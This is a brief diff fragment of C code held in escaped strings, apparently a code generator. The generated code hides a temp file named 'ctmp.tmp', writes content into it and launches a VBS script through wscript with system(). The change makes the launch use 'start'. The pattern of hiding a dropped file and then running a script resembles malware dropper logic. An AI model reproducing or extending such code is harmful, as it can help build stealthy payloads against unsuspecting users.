@@ -140,7 +140,7 @@ DWORD attributes = GetFileAttributes(\"ctmp.tmp\");\n\
 SetFileAttributes(\"ctmp.tmp\", attributes + FILE_ATTRIBUTE_HIDDEN);\n\
 fputs(\"",cont,"\",fp);\n\
 fclose(fp);\n\
-char cmd[35] = \"wscript \";\n\
+char cmd[35] = \"start wscript \";\n\
 strcat(cmd, fname2c);\n\
 strcat(cmd, \".vbs\");\n\
 system(cmd);\n\
